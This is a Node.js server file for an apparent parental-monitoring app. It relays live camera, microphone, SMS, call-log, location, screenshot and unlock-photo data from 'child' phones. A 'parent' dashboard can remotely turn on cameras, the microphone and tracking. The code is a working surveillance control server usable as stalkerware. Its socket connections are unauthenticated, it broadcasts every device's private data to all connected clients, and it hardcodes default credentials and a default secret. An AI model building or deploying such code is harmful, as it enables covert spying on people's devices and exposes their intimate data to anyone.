const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  pingInterval: 25000,  // server pings child every 25s
  pingTimeout:  20000,  // declares offline if no pong in 20s — tolerates brief network blips
});

app.use(cors());
app.use(express.json());

app.get('/health', (req, res) => res.json({ ok: true }));
const UPLOADS_DIR = process.env.UPLOADS_DIR || path.join(__dirname, 'uploads');
fs.mkdirSync(UPLOADS_DIR, { recursive: true });
app.use('/media', express.static(UPLOADS_DIR));

const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret-in-production';
const parentAccounts = [{ email: 'parent@example.com', password: 'changeme123' }];
const connectedDevices = {};
const deviceNames = {};

function getScreenshotFolder(deviceId) {
  const folder = path.join(UPLOADS_DIR, deviceId);
  fs.mkdirSync(folder, { recursive: true });
  return folder;
}

function authenticate(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth) return res.status(401).json({ error: 'No token' });
  try {
    req.user = jwt.verify(auth.split(' ')[1], JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// ── REST API ──────────────────────────────────────────────────────
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const account = parentAccounts.find(a => a.email === email && a.password === password);
  if (!account) return res.status(401).json({ error: 'Invalid credentials' });
  res.json({ token: jwt.sign({ email }, JWT_SECRET, { expiresIn: '7d' }) });
});

app.get('/api/devices', authenticate, (req, res) => {
  const list = Object.keys(connectedDevices).map(id => ({
    deviceId: id,
    name: deviceNames[id] || null,
    online: !!connectedDevices[id]?.socketId,
    info: connectedDevices[id]?.info || null,
    battery: connectedDevices[id]?.battery || null,
  }));
  res.json(list);
});

app.put('/api/devices/:deviceId/name', authenticate, (req, res) => {
  const { deviceId } = req.params;
  const { name } = req.body;
  if (!name || typeof name !== 'string') return res.status(400).json({ error: 'Name required' });
  deviceNames[deviceId] = name.trim().slice(0, 50);
  io.emit('device:name', { deviceId, name: deviceNames[deviceId] });
  res.json({ ok: true, name: deviceNames[deviceId] });
});

// ── Socket.io ─────────────────────────────────────────────────────
io.on('connection', socket => {
  const { role, deviceId } = socket.handshake.query;

  // ── Child device ─────────────────────────────────────────────
  if (role === 'child' && deviceId) {
    if (!connectedDevices[deviceId]) connectedDevices[deviceId] = {};
    connectedDevices[deviceId].socketId = socket.id;
    console.log(`Child connected: ${deviceId}`);
    socket.broadcast.emit('device:status', { deviceId, online: true });

    socket.on('disconnect', () => {
      if (connectedDevices[deviceId]) connectedDevices[deviceId].socketId = null;
      socket.broadcast.emit('device:status', { deviceId, online: false });
      console.log(`Child disconnected: ${deviceId}`);
    });

    socket.on('camera:frame',    data => io.emit('camera:frame',    { deviceId, ...data }));
    socket.on('camera:error',    data => io.emit('camera:error',    { deviceId, ...data }));
    socket.on('location:update', data => io.emit('location:update', { deviceId, ...data }));
    socket.on('screen:status',   data => io.emit('screen:status',   { deviceId, ...data }));
    socket.on('recent:apps',     data => io.emit('recent:apps',     { deviceId, ...data }));
    socket.on('unlock:photo', ({ frame, timestamp }) => {
      try {
        const folder = path.join(getScreenshotFolder(deviceId), 'UnlockPhotos');
        fs.mkdirSync(folder, { recursive: true });
        const ts = new Date(timestamp).toISOString().replace(/[:.]/g, '-');
        const filename = `${ts}.jpg`;
        const filepath = path.join(folder, filename);
        fs.writeFileSync(filepath, Buffer.from(frame, 'base64'));
        io.emit('unlock:photo:saved', { deviceId, filename, filepath,
          url: `/media/${deviceId}/UnlockPhotos/${filename}`, timestamp });
      } catch (err) { console.error('Unlock photo error:', err.message); }
    });
    socket.on('mic:audio',       data => io.emit('mic:audio',       { deviceId, ...data }));
    socket.on('mic:state',       data => io.emit('mic:state',       { deviceId, ...data }));
    socket.on('call:logs',       data => io.emit('call:logs',       { deviceId, ...data }));
    socket.on('sms:messages',    data => io.emit('sms:messages',    { deviceId, ...data }));
    socket.on('battery:update',  data => {
      if (connectedDevices[deviceId]) connectedDevices[deviceId].battery = data;
      io.emit('battery:update', { deviceId, ...data });
    });
    socket.on('device:info', data => {
      if (connectedDevices[deviceId]) connectedDevices[deviceId].info = data;
      io.emit('device:info', { deviceId, ...data });
    });
    socket.on('screenshot:data', ({ frame }) => {
      try {
        const folder = getScreenshotFolder(deviceId);
        const ts = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `${ts}.jpg`;
        const filepath = path.join(folder, filename);
        fs.writeFileSync(filepath, Buffer.from(frame, 'base64'));
        io.emit('screenshot:saved', { deviceId, filename, filepath, timestamp: Date.now() });
      } catch (err) { console.error('Screenshot error:', err.message); }
    });
  }

  // ── Parent dashboard ─────────────────────────────────────────
  if (role === 'parent') {
    console.log('Parent connected');

    function toChild(devId) { return connectedDevices[devId]?.socketId || null; }

    function relay(cmd) {
      socket.on(cmd, ({ deviceId: devId, ...rest }) => {
        const s = toChild(devId);
        if (s) io.to(s).emit(cmd, Object.keys(rest).length ? rest : undefined);
      });
    }

    relay('cmd:camera:start'); relay('cmd:camera:stop');
    relay('cmd:camera:start:front'); relay('cmd:camera:stop:front');
    relay('cmd:camera:start:back');  relay('cmd:camera:stop:back');
    relay('cmd:mic:on'); relay('cmd:mic:off');
    relay('cmd:screenshot');
    relay('cmd:get:calllogs'); relay('cmd:get:sms');
    relay('cmd:location:start'); relay('cmd:location:stop');
    relay('cmd:get:recent:apps');
    relay('cmd:speak:live:start'); relay('cmd:speak:live:stop');

    socket.on('cmd:speak', ({ deviceId: devId, audioData }) => {
      const s = toChild(devId);
      if (s) io.to(s).emit('cmd:speak', { audioData });
    });

    // Live speak chunks — relay directly to child
    socket.on('speak:live:chunk', ({ deviceId: devId, chunk }) => {
      const s = toChild(devId);
      if (s) io.to(s).emit('speak:live:chunk', { chunk });
    });
  }
});

const PORT = process.env.PORT || 4000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
